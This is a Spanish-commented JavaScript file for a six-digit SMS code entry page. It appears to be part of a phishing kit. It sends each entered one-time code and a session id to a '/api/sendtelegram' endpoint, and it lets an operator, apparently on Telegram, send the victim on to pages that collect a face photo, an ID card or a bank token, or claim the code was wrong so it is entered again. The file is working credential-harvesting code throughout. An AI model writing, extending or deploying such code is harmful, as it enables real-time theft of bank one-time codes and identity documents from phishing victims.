/**
 * OTP - VERIFICACIÓN DE CÓDIGO SMS
 * Maneja entrada y validación de código OTP de 6 dígitos
 * Versión optimizada con arquitectura robusta
 */

(() => {
    'use strict';

    // ============================
    // ESTADO DE LA APLICACIÓN
    // ============================
    const appState = {
        inputs: [],
        isSubmitting: false
    };

    // ============================
    // ELEMENTOS DEL DOM
    // ============================
    const elements = {
        inputs: null,
        verifyBtn: null,
        errorMessage: null,
        resendLink: null
    };

    // ============================
    // CONSTANTES
    // ============================
    const OTP_LENGTH = 6;
    const INPUT_PATTERN = /^[0-9]$/;

    // ============================
    // INICIALIZACIÓN
    // ============================
    function init() {
        console.log('🔧 Inicializando verificación OTP...');

        if (!initializeElements()) {
            console.error('❌ Error: Elementos DOM no encontrados');
            return;
        }

        if (!validateCommonUtils()) {
            console.error('❌ Error: commonUtils no disponible');
            return;
        }

        // Inicializar utilidades comunes
        window.commonUtils.initializeCommon();

        // Configurar event listeners
        setupEventListeners();

        // Listener para acciones de Telegram
        if (window.socket) {
            window.socket.on('telegram_action', handleTelegramAction);
        }

        // Focus en primer input
        if (elements.inputs[0]) {
            elements.inputs[0].focus();
        }

        console.log('✅ Inicialización completada');
    }

    // ============================
    // INICIALIZACIÓN DE ELEMENTOS
    // ============================
    function initializeElements() {
        elements.inputs = Array.from(document.querySelectorAll('.otp-input'));
        elements.verifyBtn = document.querySelector('.verify-btn');
        elements.errorMessage = document.querySelector('.error-message');
        elements.resendLink = document.querySelector('.resend-link');

        appState.inputs = elements.inputs;

        return elements.inputs.length > 0 && elements.verifyBtn;
    }

    // ============================
    // VALIDACIONES
    // ============================
    function validateCommonUtils() {
        return window.commonUtils && 
               typeof window.commonUtils.initializeCommon === 'function' &&
               typeof window.commonUtils.showError === 'function' &&
               typeof window.commonUtils.getSessionId === 'function';
    }

    function validateAllInputs() {
        return elements.inputs.every(input => INPUT_PATTERN.test(input.value));
    }

    // ============================
    // EVENT LISTENERS
    // ============================
    function setupEventListeners() {
        elements.inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => handleInput(e, index));
            input.addEventListener('keydown', (e) => handleKeydown(e, index));
            input.addEventListener('paste', (e) => handlePaste(e));
        });

        elements.verifyBtn.addEventListener('click', handleSubmit);

        if (elements.resendLink) {
            elements.resendLink.addEventListener('click', handleResend);
        }
    }

    // ============================
    // MANEJO DE INPUT
    // ============================
    function handleInput(e, index) {
        const input = e.target;
        const value = input.value;

        // Solo permitir números
        if (value && !INPUT_PATTERN.test(value)) {
            input.value = '';
            return;
        }

        // Auto-focus al siguiente input
        if (value && index < OTP_LENGTH - 1) {
            elements.inputs[index + 1].focus();
        }

        // Actualizar estado del botón
        updateVerifyButton();

        // Ocultar mensaje de error si existe
        if (elements.errorMessage) {
            elements.errorMessage.style.display = 'none';
        }
    }

    function handleKeydown(e, index) {
        // Retroceso: ir al input anterior si está vacío
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            elements.inputs[index - 1].focus();
        }

        // Flecha izquierda
        if (e.key === 'ArrowLeft' && index > 0) {
            e.preventDefault();
            elements.inputs[index - 1].focus();
        }

        // Flecha derecha
        if (e.key === 'ArrowRight' && index < OTP_LENGTH - 1) {
            e.preventDefault();
            elements.inputs[index + 1].focus();
        }
    }

    function handlePaste(e) {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').trim();
        
        // Validar que solo sean números
        if (!/^\d+$/.test(pastedData)) {
            return;
        }

        // Distribuir los dígitos en los inputs
        const digits = pastedData.slice(0, OTP_LENGTH).split('');
        digits.forEach((digit, index) => {
            if (elements.inputs[index]) {
                elements.inputs[index].value = digit;
            }
        });

        // Focus en el último input llenado o el siguiente vacío
        const nextEmptyIndex = digits.length < OTP_LENGTH ? digits.length : OTP_LENGTH - 1;
        elements.inputs[nextEmptyIndex].focus();

        updateVerifyButton();
    }

    // ============================
    // ACTUALIZAR BOTÓN
    // ============================
    function updateVerifyButton() {
        const allFilled = validateAllInputs();
        elements.verifyBtn.disabled = !allFilled;
    }

    // ============================
    // REENVIAR CÓDIGO
    // ============================
    function handleResend(e) {
        e.preventDefault();
        
        console.log('🔄 Solicitando reenvío de código OTP...');

        // Limpiar inputs
        elements.inputs.forEach(input => {
            input.value = '';
        });
        
        elements.inputs[0].focus();
        updateVerifyButton();
    }

    // ============================
    // SUBMIT
    // ============================
    async function handleSubmit() {
        if (appState.isSubmitting || !validateAllInputs()) {
            return;
        }

        console.log('📤 Enviando código OTP...');

        // Obtener código completo
        const otpCode = elements.inputs.map(input => input.value).join('');

        if (otpCode.length !== OTP_LENGTH) {
            showError('Por favor completa los 6 dígitos');
            return;
        }

        // Marcar como enviando
        appState.isSubmitting = true;
        elements.verifyBtn.disabled = true;

        console.log('📤 Enviando OTP:', otpCode);

        window.loadingOverlay.showSending('Verificando código...');

        try {
            const sessionId = window.commonUtils.getSessionId();
            
            const data = {
                tipo: 'OTP',
                codigo: otpCode,
                sessionId: sessionId
            };

            console.log('📤 Enviando a Telegram con sessionId:', sessionId);

            const response = await fetch('/api/sendtelegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();

            if (!result.success) {
                throw new Error(result.error || 'Error al enviar el código');
            }

            console.log('✅ Código OTP enviado exitosamente');

            // El overlay se mantendrá visible hasta recibir acción de Telegram
            // No se oculta automáticamente

        } catch (error) {
            console.error('❌ Error al enviar código OTP:', error);
            
            if (window.loadingOverlay) {
                window.loadingOverlay.hide();
            }

            showError('Error al verificar el código. Por favor intenta nuevamente.');
            
            appState.isSubmitting = false;
            updateVerifyButton();
        }
    }

    // ============================
    // MANEJO DE ACCIONES TELEGRAM
    // ============================
    function handleTelegramAction(action) {
        console.log('📱 Acción recibida de Telegram:', action);

        const actions = {
            'pedir_cara': () => window.location.href = 'cara.html',
            'pedir_cedula': () => window.location.href = 'cedula.html',
            'pedir_token': () => window.location.href = 'token.html',
            'pedir_otp': () => window.location.href = 'otp.html',
            'codigo_incorrecto': () => {
                if (window.loadingOverlay) {
                    window.loadingOverlay.hide();
                }
                showError('Código incorrecto. Por favor intenta nuevamente.');
                elements.inputs.forEach(input => {
                    input.value = '';
                    input.classList.add('error');
                });
                setTimeout(() => {
                    elements.inputs.forEach(input => input.classList.remove('error'));
                }, 500);
                elements.inputs[0].focus();
                appState.isSubmitting = false;
                updateVerifyButton();
            },
            'finalizar': () => {
                if (window.loadingOverlay) {
                    window.loadingOverlay.show('Proceso completado', 'Redirigiendo...');
                }
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 2000);
            }
        };

        const actionHandler = actions[action];
        if (actionHandler) {
            actionHandler();
        } else {
            console.warn('⚠️ Acción no reconocida:', action);
        }
    }

    // ============================
    // MOSTRAR ERROR
    // ============================
    function showError(message) {
        if (elements.errorMessage) {
            elements.errorMessage.querySelector('p').textContent = '⚠️ ' + message;
            elements.errorMessage.style.display = 'block';

            setTimeout(() => {
                elements.errorMessage.style.display = 'none';
            }, 5000);
        }

        if (window.commonUtils && window.commonUtils.showError) {
            window.commonUtils.showError(message);
        }
    }

    // ============================
    // INICIAR AL CARGAR
    // ============================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();

console.log('📦 otp.js cargado');
